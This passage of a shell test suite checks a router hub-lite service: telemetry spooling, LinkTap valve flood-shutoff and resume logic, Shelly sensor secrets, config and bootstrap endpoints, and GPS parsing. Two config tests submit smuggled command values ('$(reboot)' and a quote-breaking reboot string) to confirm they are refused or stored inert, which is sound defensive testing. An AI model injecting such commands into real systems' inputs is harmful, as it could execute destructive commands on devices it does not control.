printf '1\ts1\ttemp.measurement\tv=1\n2\ts2\tflood.alarm\t\n3\ts1\ttemp.measurement\tv=2\n4\tb1\tbutton.push\t\n5\ts1\ttemp.measurement\tv=3\n' > "$T/sp"
spool_cap "$T/sp" 3
check "spool cap: bounded to the limit" "3" "$(wc -l < "$T/sp" | tr -d ' ')"
check "spool cap: the OLDEST READINGS go first; alarms survive" "flood.alarm button.push temp.measurement" "$(cut -f3 "$T/sp" | tr '\n' ' ' | sed 's/ $//')"
check "spool cap: the newest reading is the one kept" "v=3" "$(grep temp "$T/sp" | cut -f4)"
printf '1\ta\tflood.alarm\t\n2\tb\tleak.alarm\t\n3\tc\tsmoke.alarm\t\n' > "$T/sp"
spool_cap "$T/sp" 2
check "spool cap: with nothing but alarms, the oldest alarm goes" "leak.alarm smoke.alarm" "$(cut -f3 "$T/sp" | tr '\n' ' ' | sed 's/ $//')"
check "classify: 200 sent" "sent" "$(classify_http 200)"
check "classify: 503 retry" "retry" "$(classify_http 503)"
check "classify: 429 retry" "retry" "$(classify_http 429)"
check "classify: no HTTP answer at all is a retry" "retry" "$(classify_http 000)"
check "classify: 401 is a refusal resending cannot fix" "refused" "$(classify_http 401)"

# drain_relay with a stubbed worker: a refusal drops, an outage keeps, a success applies the gate.
(
  RELAY_SPOOL="$T/rs"; RELAY_SEQ_FILE="$T/rs.seq"; RELAY_STATE_DIR="$T/rs.state"; RELAY_BOOT_FILE="$T/rs.boot"
  CONF="$T/conf.drain"; cp "$T/conf" "$CONF"; LT_STATE_DIR="$T/lt"
  VID=v; DEVICE_ID=d; DEVICE_TOKEN=tok; WORKER_URL=https://w; LINKTAP_ALLOWED=0
  curl() { _o=""; _p=""; for _a in "$@"; do [ "$_p" = "-o" ] && _o="$_a"; _p="$_a"; done
           printf '%s' "$DRAIN_BODY" > "$_o"; printf '%s' "$DRAIN_CODE"; }
  printf '1\tlt_x\tlinktap.measurement\twatering=0\n' > "$RELAY_SPOOL"
  DRAIN_CODE=503; DRAIN_BODY=''; drain_relay
  echo "503:$([ -s "$RELAY_SPOOL.sending" ] && echo kept || echo gone)" > "$T/drain"
  DRAIN_CODE=401; drain_relay
  echo "401:$([ -s "$RELAY_SPOOL.sending" ] && echo kept || echo gone)" >> "$T/drain"
  printf '1\tlt_x\tlinktap.measurement\twatering=0\n' > "$RELAY_SPOOL"
  DRAIN_CODE=200; DRAIN_BODY='{"status":"ok","linktap":{"allowed":true,"profiles":{"aaaabbbbccccdddd":{"volumeCapL":50}}}}'
  drain_relay
  echo "200:$([ -s "$RELAY_SPOOL.sending" ] && echo kept || echo gone):$LINKTAP_ALLOWED:$(grep -c '^LINKTAP_ALLOWED="1"' "$CONF"):$(cat "$LT_STATE_DIR/profile.aaaabbbbccccdddd")" >> "$T/drain"
)
check "drain: an outage (503) keeps the batch for retry" "503:kept" "$(sed -n 1p "$T/drain")"
check "drain: a refusal (401) drops it instead of wedging the spool forever" "401:gone" "$(sed -n 2p "$T/drain")"
check "drain: success clears it, adopts the plan gate and persists it, and applies the REAL-shape profiles" \
  "200:gone:1:1:P_VOL=50" "$(sed -n 3p "$T/drain")"

REAL='{"status":"ok","stored":1,"linktap":{"allowed":true,"profiles":{"aaaabbbbccccdddd":{"durationSecs":7200,"volumeCapL":250.5,"autoRestart":true}}}}'
check "profiles: the worker's REAL order (allowed first) parses — it never did" \
  "aaaabbbbccccdddd 7200 250.5 1" "$(printf '%s' "$REAL" | lt_parse_profiles)"
check "allowed: true" "1" "$(printf '%s' "$REAL" | lt_parse_allowed)"
check "allowed: false" "0" "$(printf '{"linktap":{"allowed":false}}' | lt_parse_allowed)"
check "allowed: a reply with no blob says NOTHING (never a revocation)" "" "$(printf '{"status":"ok"}' | lt_parse_allowed)"
check "allowed: an 'allowed' nested in a profile is not the vehicle's permission" "0" \
  "$(printf '{"linktap":{"profiles":{"a":{"allowed":true}},"allowed":false}}' | lt_parse_allowed)"
check "allowed: profiles first, allowed after, still found" "1" \
  "$(printf '{"linktap":{"profiles":{"a":{"volumeCapL":1}},"allowed":true}}' | lt_parse_allowed)"

# The receiver's own ceiling and secret handling.
cgi() {
  env PATH="$T/bin:$PATH" QUERY_STRING="$1" BRVG_HUB_LITE_CONF="$2" BRVG_RELAY_SPOOL="$T/cgispool" \
    BRVG_HUB_LITE_BIN="$HL_DIR/brvg-hub-lite.sh" sh "$HL_DIR/hub-lite-cgi.sh" >/dev/null 2>&1
}
: > "$T/cgispool"
cp "$T/conf" "$T/conf.sec"; echo 'SHELLY_SECRET="s3cr3t"' >> "$T/conf.sec"
cgi "device=s1&event=temp.measurement&k=s3cr3t&vid=v_test&tC=20" "$T/conf.sec"
check "receiver: k and vid are routing, never spooled as telemetry" "tC=20" "$(cut -f4 "$T/cgispool")"
: > "$T/cgispool"
cgi "device=s1&event=temp.measurement&k=wrong&tC=20" "$T/conf.sec"
check "receiver: a PRESENTED wrong secret is refused" "0" "$(wc -c < "$T/cgispool" | tr -d ' ')"
cgi "device=s1&event=temp.measurement&tC=20" "$T/conf.sec"
check "receiver: an un-keyed relay-contract report is still accepted (relay sensors carry no k)" "1" "$(wc -l < "$T/cgispool" | tr -d ' ')"
i=0; while [ $i -lt 600 ]; do printf '1\ts\tx.measurement\t\n' >> "$T/cgispool"; i=$((i + 1)); done
cgi "device=s1&event=temp.measurement&tC=21" "$T/conf.sec"
check "receiver: past the hard ceiling a READING is dropped" "0" "$(grep -c 'tC=21' "$T/cgispool")"
echo 7 > "$SHIM_RC"   # the direct send fails, so the alarm is spooled
cgi "device=s1&event=flood.cable_unplugged" "$T/conf.sec"
echo 0 > "$SHIM_RC"
check "receiver: an alarm-class line is never dropped by the ceiling" "1" "$(grep -c 'cable_unplugged' "$T/cgispool")"

echo ""
echo "# --- slice 2: LinkTap parity (ported from daemon cycle.rs / linktap_runtime.rs tests) -------"
flood_case "SENSOR FAULT: flood.cable_unplugged must NOT close" "flood.cable_unplugged" no
flood_case "sensor fault: flood.cable_disconnected" "flood.cable_disconnected" no
flood_case "sensor fault: flood.fault" "flood.fault" no
flood_case "sensor fault: flood.error" "flood.error" no
flood_case "sensor fault: flood.low_battery" "flood.low_battery" no
flood_case "sensor fault: flood.mute" "flood.mute" no
flood_case "sensor fault: flood.unmute" "flood.unmute" no
flood_case "sensor fault: leak.sensor_offline" "leak.sensor_offline" no
flood_case "real Shelly: flood" "flood" yes
flood_case "real Shelly: Flood Detected" "Flood Detected" yes
flood_case "real Shelly: shelly.flood" "shelly.flood" yes
flood_case "real Shelly: water_leak" "water_leak" yes
flood_case "real Shelly: smoke.alarm" "smoke.alarm" yes
flood_case "gateway offline never closes the valve it cannot reach" "linktap.gateway.offline" no
flood_case "gateway online never closes a valve" "linktap.gateway.online" no

NOW=1787140800
hand() { if lt_should_hand_over "$@"; then echo yes; else echo no; fi; }
check "handover: 200 s left is not the time" "no" "$(hand washdown 1 hub "" 0 200 $NOW 300 $((NOW + 100)))"
check "handover: inside the 20 s lead, valve still open" "yes" "$(hand washdown 1 hub "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: exactly once" "no" "$(hand washdown 1 hub "" 0 8 $NOW 300 $((NOW + 292)) 20 | sed 's/.*/no/'; )"
check "handover: already issued never re-issues" "no" "$(hand washdown 1 hub "" 1 8 $NOW 300 $((NOW + 292)))"
check "handover: a washdown being STOPPED (flood) never hands over" "no" "$(hand washdown 1 hub flood_shutoff 0 15 $NOW 300 $((NOW + 285)))"
check "handover: not asked to resume, not done" "no" "$(hand washdown 0 hub "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: an ADOPTED run carries no intent of ours" "no" "$(hand washdown 1 adopted "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: a Normal Run never hands over" "no" "$(hand normal 1 hub "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: no remain from the gateway falls back to our own clock" "yes" "$(hand washdown 1 hub "" 0 - $NOW 300 $((NOW + 285)))"
res() { if lt_should_resume "$@"; then echo yes; else echo no; fi; }
check "resume: a washdown told to resume reopens on its timer" "yes" "$(res washdown timer 1)"
for _r in flood_shutoff manual volume_cap unknown; do
  check "resume: $_r must NOT reopen the valve" "no" "$(res washdown "$_r" 1)"
done
check "resume: not asked for, not done" "no" "$(res washdown timer 0)"
check "resume: a Normal Run cannot carry the intent" "no" "$(res normal timer 1)"

mkdir -p "$T/ph"
(
  LT_STATE_DIR="$T/ph"
  echo "idle:$(lt_poll_hint $NOW)" > "$T/hint"
  lt_write_state "$T/ph/$DEV" watering $NOW "" washdown 300 0 hub 1 0
  echo "180:$(lt_poll_hint $((NOW + 100)))" >> "$T/hint"
  echo "5:$(lt_poll_hint $((NOW + 299)))" >> "$T/hint"
  lt_write_state "$T/ph/$DEV" watering $NOW "" washdown 300 0 hub 0 0
  echo "plain:$(lt_poll_hint $((NOW + 100)))" >> "$T/hint"
)
check "poll hint: an idle valve asks for nothing" "idle:" "$(sed -n 1p "$T/hint")"
check "poll hint: 300 s run, 100 s in, 20 s lead -> look again in 180 s" "180:180" "$(sed -n 2p "$T/hint")"
check "poll hint: never busier than every 5 s" "5:5" "$(sed -n 3p "$T/hint")"
check "poll hint: a washdown with no resume is not time-critical" "plain:" "$(sed -n 4p "$T/hint")"

MIN=60
check "gw watch: the first good poll is not news" "0 0 none 0" "$(lt_gw_watch_step "" 0 1 0)"
check "gw watch: a flap inside the window says nothing" "0 0 none 0" "$(lt_gw_watch_step 0 0 0 20)"
check "gw watch: a recovery nobody was told about stays silent" "40 0 none 0" "$(lt_gw_watch_step 0 0 1 40)"
check "gw watch: 29 min silent is still a flap" "0 0 none 0" "$(lt_gw_watch_step 0 0 0 $((29 * MIN)))"
check "gw watch: 31 min silent reports offline ONCE with the duration" "0 1 offline 31" "$(lt_gw_watch_step 0 0 0 $((31 * MIN)))"
check "gw watch: and never again for the same episode" "0 1 none 0" "$(lt_gw_watch_step 0 1 0 $((45 * MIN)))"
check "gw watch: a reported outage reports its recovery" "3600 0 online 60" "$(lt_gw_watch_step 0 1 1 $((60 * MIN)))"
check "gw watch: booting next to a dead gateway starts the clock at the first poll" "1 0 none 0" "$(lt_gw_watch_step "" 0 0 1)"
check "gw watch: the grace window is the owner's thirty minutes" "1800" "$LT_GATEWAY_GRACE_SECS"

check "push: dev_stat shape" "$DEV" "$(printf '{"gw_id":"G","dev_stat":[{"dev_id":"%s","is_watering":1}]}' "$DEV" | lt_parse_push)"
check "push: bare shape, long ids normalise to 16" "$DEV" "$(printf '{"dev_id":"%s0042","is_watering":0}' "$DEV" | lt_parse_push)"
check "push: junk yields nothing" "" "$(printf 'not json' | lt_parse_push)"
check "push: empty object yields nothing" "" "$(printf '{}' | lt_parse_push)"

out=$(printf '{"is_watering":1,"vol":3.2,"speed":5.5,"battery":93,"signal":69,"is_rf_linked":true}' | lt_parse_fields)
check "fields: battery, signal and rf — what the app read off the gateway" "&meters=0&battery=93&signal=69&rf=1" "$out"
out=$(printf '{"is_watering":0,"volume":1,"is_broken":true,"is_leak":false,"is_clog":true,"is_cutoff":false}' | lt_parse_fields)
check "fields: the fault flags the app raises alarms from" "&meters=1&broken=1&leak=0&clog=1&cutoff=0" "$out"
out=$(printf '{"is_watering":0}' | lt_parse_fields)
check "fields: a gateway that omits them does not get invented zeros" "&meters=0" "$out"
check "fields: is_flm_plugin is authoritative" "&meters=1" "$(printf '{"is_flm_plugin":true}' | lt_parse_fields)"

out=$(lt_measurement_params 1 3.2 "" 5.5 "" 1 normal 86400 1135.6 212 hub)
check "measurement: a hub run reports ITS targets and who started it" \
  "watering=1&vol_l=3.20&flow_lpm=5.50&mode=normal&dur_s=86400&cap_l=1135.60&remain_s=212&prov=hub" "$out"
out=$(lt_measurement_params 1 1 "" 5.5 "" 1 washdown 7200 0 - hub)
check "measurement: a washdown is bounded by TIME only (cap_l 0.00), no remain when unknown" \
  "watering=1&vol_l=1.00&flow_lpm=5.50&mode=washdown&dur_s=7200&cap_l=0.00&prov=hub" "$out"
out=$(lt_measurement_params 0 0 "" 0 "&day=2026-09-13&day_vol_l=4.00" 0 normal 1 1 - hub)
check "measurement: an idle valve reports no targets and no flow at all" "watering=0&vol_l=0.00&day=2026-09-13&day_vol_l=4.00" "$out"
check "measurement: watering with no flow reading reports 0.00, not silence" "watering=1&vol_l=2.00&flow_lpm=0.00" \
  "$(lt_measurement_params 1 2 "" 0 "" 0 normal 1 1 - hub)"

check "start body: a washdown omits volume_limit (daemon build_start)" '{"cmd":6,"gw_id":"GW02","dev_id":"aaaabbbbccccdddd","duration":7200}' \
  "$(lt_start_body GW02 aaaabbbbccccdddd 7200 "")"

# The machine end to end, through linktap_tick and a stubbed gateway.
tick() {  # $1 cmd3 reply, $2 plan permission (default 1); one tick in a subshell against $T/lt2
  # (The permission is an ARGUMENT, not `VAR=x tick`: a POSIX shell may keep an assignment that
  # prefixes a function call, and it did — leaking into every later tick and the stripped re-run.)
  printf '%s' "$1" > "$SHIM_CMD3"; : > "$SHIM_LOG"
  ( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; CONF="$T/conf"; . "$T/conf"; PATH="$T/bin:$PATH"
    LINKTAP_ALLOWED="${2:-1}"; linktap_tick )
}
mkdir -p "$T/lt2"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 1 )) "" normal 86400 1135.6 hub 0 0
tick '{"is_watering":1,"volume":3.2,"remain_duration":212,"speed":5.5}'
check "tick: a run the hub opened is its own, not adopted" "hub 86400" "$(. "$T/lt2/$DEV"; echo "$prov $dur")"
rm -f "$T/lt2/$DEV"
tick '{"is_watering":1,"volume":3.2,"remain_duration":212}'
check "tick: an already-running valve IS adopted, bounded by what the gateway says" "adopted 212 378" "$(. "$T/lt2/$DEV"; echo "$prov $dur $cap")"
check "tick: and its measurement says adopted" "1" "$(grep -c 'prov=adopted&*' "$T/lt2/meas.$DEV")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 285 )) "" washdown 300 0 hub 1 0
tick '{"is_watering":1,"volume":8,"remain_duration":15}'
check "tick: the washdown HANDS OVER inside its lead window — cmd 6 on the open valve" "1" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: ...into the valve's PROFILE Normal Run" "1" "$(grep '"cmd":6' "$SHIM_LOG" | grep -c '"duration":86400')"
check "tick: ...recorded as ours, so the next poll does not adopt it" "normal hub 0" "$(. "$T/lt2/$DEV"; echo "$mode $prov $handover")"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 285 )) "" washdown 300 0 hub 1 0
tick '{"is_watering":1,"volume":8,"remain_duration":15}' 0
check "tick: the handover is an OPEN, so it is plan-gated" "0" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: and says so" "1" "$(grep -c 'linktap.reopen_failed.*plan_not_permitted' "$T/spool2")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 300 )) "" washdown 300 0 hub 1 1
tick '{"is_watering":0,"volume":9}'
check "tick: a washdown told to resume that ran out on its timer reopens" "1" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: the cycle end carries its mode, like the daemon's" "1" "$(grep -c 'linktap.cycle.change.*mode=washdown&reason=timer' "$T/spool2")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" washdown 300 0 hub 1 0
( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; . "$T/conf"; PATH="$T/bin:$PATH"; linktap_flood_close )
check "flood close: marks the run it stops as flood_shutoff" "flood_shutoff" "$(. "$T/lt2/$DEV"; echo "$stop")"
tick '{"is_watering":0,"volume":3}'
check "tick: a washdown STOPPED BY A FLOOD never reopens the valve" "0" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: and its end classifies as flood_shutoff, not unknown" "1" "$(grep -c 'reason=flood_shutoff' "$T/spool2")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
printf '{"is_watering":1,"volume":20}' > "$SHIM_CMD3"; : > "$SHIM_LOG"
( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; . "$T/conf"; PATH="$T/bin:$PATH"; LINKTAP_ALLOWED=1
  curl() { case "$*" in *'"cmd":7'*) return 7 ;; *) command curl "$@" ;; esac; }
  linktap_tick )
check "tick: a cutoff STOP that fails is un-marked, so the next poll cuts again (never left uncapped)" "" "$(. "$T/lt2/$DEV"; echo "$stop")"
check "tick: and the failure is reported" "1" "$(grep -c 'linktap.stop_failed&*.*gateway_unreachable$' "$T/spool2")"
rm -f "$T/lt2/$DEV"
echo 7 > "$SHIM_RC"
tick '{}'
check "tick: an unreachable gateway starts the reachability clock" "yes" "$([ -s "$T/lt2/gw.watch" ] && echo yes || echo no)"
echo 0 > "$SHIM_RC"
( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; . "$T/conf"; PATH="$T/bin:$PATH"; echo 22 > "$SHIM_RC"
  printf '1 0\n' > "$T/lt2/gw.watch"; rm -f "$T/lt2/$DEV"; linktap_flood_close; echo 0 > "$SHIM_RC" )
check "flood close: a close the gateway did not take spools stop_failed with cause=flood" "1" "$(grep -c 'linktap.stop_failed.*cause=flood' "$T/spool2")"

# The gateway push route: rings the loop for a watched valve, from the gateway's address only.
rm -f "$T/lt/wake"
r=$(api POST /linktap/push "{\"dev_stat\":[{\"dev_id\":\"$DEV\",\"is_watering\":1}]}" REMOTE_ADDR=192.168.8.50 HTTP_AUTHORIZATION="")
check "push route: answers ok with no key (the gateway has none)" "200" "$(status_of "$r")"
check "push route: a push naming a watched valve rings the poll loop" "yes" "$([ -f "$T/lt/wake" ] && echo yes || echo no)"
rm -f "$T/lt/wake"
r=$(api POST /linktap/push "{\"dev_id\":\"$DEV\"}" REMOTE_ADDR=192.168.8.99 HTTP_AUTHORIZATION="")
check "push route: from anywhere else it is the same 'ok' and does nothing" "200 no" "$(status_of "$r") $([ -f "$T/lt/wake" ] && echo yes || echo no)"

echo ""
echo "# --- slice 3: the rest of the daemon's hub contract ----------------------------------------"
cp "$T/conf" "$T/conf.orig"
r=$(api POST /config '{"name":"Aft router","heartbeatSecs":900,"shellySecret":"s3cr3t-Value_1","unknownKey":1}')
check "config: accepted" "200" "$(status_of "$r")"
check "config: answers with the new status" "1" "$(body_of "$r" | grep -c '"name":"Aft router","enabled":true,"heartbeatSecs":900')"
check "config: shellySecret arms the ingest, and is never echoed" "1 0" "$(body_of "$r" | grep -c '"shellyIngestArmed":true') $(body_of "$r" | grep -c 's3cr3t')"
check "config: unknown conf keys survive the rewrite" "1" "$(grep -c '^LINKTAP_NORMAL_VOL_L=378' "$T/conf")"
check "config: the rewritten conf is chmod 600" "600" "$(ls -l "$T/conf" | cut -c2-10 | sed 's/rw-------/600/')"
check "config: asks the collector to reload" "yes" "$([ -f "$T/reload" ] && echo yes || echo no)"
r=$(api POST /config '{"heartbeatSecs":30}')
check "config: heartbeat below the 60 s floor is 422" "422" "$(status_of "$r")"
r=$(api POST /config '{"enabled":false}')
check "config: 'enabled' is refused — it would stop the service serving this door" "422" "$(status_of "$r")"
r=$(api POST /config '{"name":"x\"; reboot; \""}')
check "config: a name that is not plain text is refused" "422" "$(status_of "$r")"
r=$(api POST /config '{"name":"$(reboot)"}')
. "$T/conf"
check "config: shell metacharacters are STORED, never executed, when the conf is sourced" '$(reboot)' "$HUB_NAME"
r=$(api POST /config '{"gps":{"kind":"cradlepoint","host":"192.168.0.1","username":"admin","password":"p@ss w0rd"}}')
check "config: a daemon-shaped cradlepoint gps source" "200" "$(status_of "$r")"
check "config: gps reported redacted, with 443 as the default port" "1 0" \
  "$(body_of "$r" | grep -c '"gps":{"kind":"cradlepoint","host":"192.168.0.1","port":443,"protocol":"tcp","username":"admin","devId":"","enabled":true,"hasPassword":true}') $(body_of "$r" | grep -c 'p@ss')"
r=$(api POST /gps '{"kind":"nmea","host":"192.168.8.30","port":10110,"protocol":"udp"}')
check "gps: UDP NMEA is refused honestly" "422" "$(status_of "$r")"
r=$(api POST /gps '{"kind":"nmea","host":"192.168.8.30","port":2000}')
check "gps: TCP NMEA source set" "1" "$(body_of "$r" | grep -c '"gps":{"kind":"nmea","host":"192.168.8.30","port":2000')"
r=$(api POST /token '{"token":"short"}')
check "token: not a device token is 422" "422" "$(status_of "$r")"
r=$(api POST /token '{"token":"tok_ROTATED_0123456789"}')
check "token: rotated" "200 1" "$(status_of "$r") $(grep -c '^DEVICE_TOKEN="tok_ROTATED_0123456789"' "$T/conf")"
r=$(api GET /logs "")
check "logs: tails the hub-lite's own lines only" "3" "$(body_of "$r" | sed 's/\\n/\n/g' | grep -c 'brvg-hub-lite')"
check "logs: the management key and any t= value are redacted" "0 0" \
  "$(body_of "$r" | grep -c "$KEY") $(body_of "$r" | grep -c 'tok_SECRET')"
r=$(PATH="$T/bin:/usr/bin:/bin" api POST /update "")
check "update: 501 where there is no opkg (a Pi, a test box)" "501" "$(status_of "$r")"

r=$(api GET /identity "" REMOTE_ADDR=127.0.0.1)
check "identity: a claimed router refuses setup forever" "409" "$(status_of "$r")"
cat > "$T/conf" <<'CONF'
WORKER_URL="https://api.example.test"
CONF
r=$(api GET /identity "" REMOTE_ADDR=10.9.9.9 HTTP_AUTHORIZATION="")
check "identity: off the router's /24 is refused" "403" "$(status_of "$r")"
r=$(api GET /ping "" HTTP_AUTHORIZATION="")
check "ping: an unclaimed router inside its window is adoptable" "1" "$(body_of "$r" | grep -c '"adoptable":true')"
r=$(api GET /identity "" REMOTE_ADDR=192.168.8.20 HTTP_AUTHORIZATION="")
check "identity: mints a brv_net_ id from the same /24, inside the window" "200 1" "$(status_of "$r") $(body_of "$r" | grep -c '"hubId":"brv_net_[0-9a-f]\{12\}"')"
echo $(( $(date +%s) - 901 )) > "$T/started"
r=$(api POST /bootstrap '{"vid":"v_new","token":"tok_NEW_0123456789ab"}' REMOTE_ADDR=192.168.8.20 HTTP_AUTHORIZATION="")
check "bootstrap: the window closes 15 minutes after service start" "403" "$(status_of "$r")"
r=$(api POST /bootstrap '{"vid":"v_new","name":"Router","token":"tok_NEW_0123456789ab","heartbeatSecs":600}' REMOTE_ADDR=127.0.0.1 HTTP_AUTHORIZATION="")
check "bootstrap: loopback is not time-boxed (daemon adopt.rs)" "200" "$(status_of "$r")"
check "bootstrap: writes the vehicle, the token and the id (double-quoted, as postinst greps)" "3" \
  "$(grep -cE '^(VID="v_new"|DEVICE_TOKEN="tok_NEW_0123456789ab"|DEVICE_ID="brv_net_[0-9a-f]+")$' "$T/conf")"
r=$(api POST /bootstrap '{"vid":"v_other","token":"tok_OTHER_0123456789"}' REMOTE_ADDR=127.0.0.1 HTTP_AUTHORIZATION="")
check "bootstrap: and then the door is shut" "409" "$(status_of "$r")"
date +%s > "$T/started"
cp "$T/conf.orig" "$T/conf"

r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=x")
check "shelly: DENY WHEN UNSET, like the daemon" "401" "$(status_of "$r")"
echo 'SHELLY_SECRET="s3cr3t"' >> "$T/conf"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=nope" HTTP_AUTHORIZATION="")
check "shelly: a wrong k is 401" "401" "$(status_of "$r")"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=s3cr3t&vid=v_else" HTTP_AUTHORIZATION="")
check "shelly: another vehicle's report is 404" "404" "$(status_of "$r")"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=s3cr3t" REMOTE_ADDR=8.8.8.8 HTTP_AUTHORIZATION="")
check "shelly: a caller off any plausible vessel network is 403" "403" "$(status_of "$r")"
: > "$T/spool"; : > "$SHIM_LOG"; echo 7 > "$SHIM_RC"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=s3cr3t&vid=v_test&ts=1" HTTP_AUTHORIZATION="" REMOTE_ADDR=100.70.1.2)
echo 0 > "$SHIM_RC"
check "shelly: CGNAT (Starlink/cellular LANs) is plausible, and the report is accepted" "200" "$(status_of "$r")"
check "shelly: the flood close ran through the receiver" "1" "$(grep -c '"cmd":7' "$SHIM_LOG")"
check "shelly: the undelivered alarm is spooled WITHOUT the secret" "1 0" "$(grep -c 'flood.alarm' "$T/spool") $(grep -c 's3cr3t' "$T/spool")"

echo ""
echo "# --- slice 3: GPS, updates, conf, loop ----------------------------------------------------"
check "nmea: a torn sentence that fails its checksum is rejected" "" \
  "$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*61\n' | parse_nmea_rmc)"
check "nmea: a sentence with no checksum is accepted (forwarders strip it)" "41.40846 -81.74975" \
  "$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A\n' | parse_nmea_rmc)"
check "nmea: GGA is the fallback, with HDOP x 5 as accuracy" "48.11730 11.51667 4" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n' | parse_nmea_rmc)"
check "nmea: RMC is preferred over GGA" "41.40846 -81.74975" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\r\n' | parse_nmea_rmc)"
check "nmea: GGA with no fix quality is not a fix" "" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,0,08,0.9,545.4,M,46.9,M,,\r\n' | parse_nmea_rmc)"
check "cradlepoint: unset port is HTTPS on 443 (daemon default)" "https://192.168.0.1" "$(cradlepoint_base 192.168.0.1 "")"
check "cradlepoint: 443 is https" "https://h" "$(cradlepoint_base h 443)"
check "cradlepoint: 80 is http" "http://h" "$(cradlepoint_base h 80)"
check "cradlepoint: any other port is http with the port" "http://h:8080" "$(cradlepoint_base h 8080)"
( CRADLEPOINT_HOST=192.168.0.1; CRADLEPOINT_PORT=""; curl() { echo "$*" > "$T/cp"; }; read_gps_cradlepoint )
check "cradlepoint: the https poll passes -k (NCOS self-signs on the LAN)" "1" "$(grep -c -- '-k .*https://192.168.0.1/api/status/gps' "$T/cp")"
vn() { if version_newer "$1" "$2"; then echo yes; else echo no; fi; }
check "version: 0.15.1 > 0.15.0" "yes" "$(vn 0.15.1 0.15.0)"
check "version: 0.15.0 is not newer than itself" "no" "$(vn 0.15.0 0.15.0)"
check "version: numeric, not lexical (0.10.0 > 0.9.9)" "yes" "$(vn 0.10.0 0.9.9)"
check "version: older is not newer" "no" "$(vn 0.14.9 0.15.0)"
check "feed: the hub-lite's version out of a Packages index" "0.15.2" \
  "$(printf 'Package: other\nVersion: 9.9\n\nPackage: brvg-hub-lite\nVersion: 0.15.2\nDepends: libc\n' | feed_version)"
check "nap: sleeps until the soonest due work" "7" "$(LT_NAP_SLICE="" next_nap 100 107 200 "")"
check "nap: sliced to 5 s while a valve could be woken" "5" "$(LT_NAP_SLICE=5 next_nap 100 200 300)"
check "nap: overdue work loops straight round (1 s, never 0 or negative)" "1" "$(LT_NAP_SLICE="" next_nap 100 50)"
( CONF="$T/si.conf"; printf 'KEEP=1\nGPS_INTERVAL=120\n' > "$CONF"; set_intervals 300 600 >/dev/null 2>&1 )
check "set_intervals: writes \$CONF (not a hard-coded /etc path) and keeps other keys" "KEEP=1 GPS_INTERVAL=\"300\" MODEM_INTERVAL=\"600\"" "$(tr '\n' ' ' < "$T/si.conf" | sed 's/ $//')"

[ -n "${KEEP_T:-}" ] && echo "T=$T" || rm -rf "$T"

# --- the PACKAGED scripts are the tested scripts ----------------------------------------------
# build-ipk.sh ships comment-stripped copies. Strip every one the same way, prove each still parses,
# and run this whole suite against them. (setup-usb-gps is shipped unstripped: its --help prints
# its own header.)
if [ -z "${BRVG_STRIPPED_RUN:-}" ]; then
  _sd=$(mktemp -d)
  mkdir -p "$_sd/package"
  _parse_ok=1
  for _f in brvg-hub-lite.sh hub-lite-api.sh hub-lite-cgi.sh hub-lite-mgmt.sh package/feed-setup.sh; do
    sh "$HL_SRC/package/strip-comments.sh" "$HL_SRC/$_f" "$_sd/$_f"
    sh -n "$_sd/$_f" || _parse_ok=0
  done
  cp "$HL_SRC/package/brvg-feed.pub" "$_sd/package/"
  check "strip: every stripped packaged script still parses (sh -n)" "1" "$_parse_ok"
  check "strip: the stripped hub-lite is well under the source" "yes" \
    "$([ "$(wc -c < "$_sd/brvg-hub-lite.sh")" -lt $(( $(wc -c < "$HL_SRC/brvg-hub-lite.sh") * 2 / 3 )) ] && echo yes || echo no)"
  if BRVG_HUB_LITE_DIR="$_sd" BRVG_STRIPPED_RUN=1 sh "$HL_SRC/test.sh" > "$_sd/run.log" 2>&1; then _sr=pass; else _sr=fail; fi
  [ "$_sr" = "pass" ] || grep -A2 '^FAIL' "$_sd/run.log"
  check "strip: the full suite passes against the STRIPPED copies ($(grep -c '^ok' "$_sd/run.log") checks)" "pass" "$_sr"
  rm -rf "$_sd"
fi

if [ "$fails" -gt 0 ]; then
  echo "$fails test(s) FAILED"
  exit 1
fi
echo "all hub-lite tests passed"
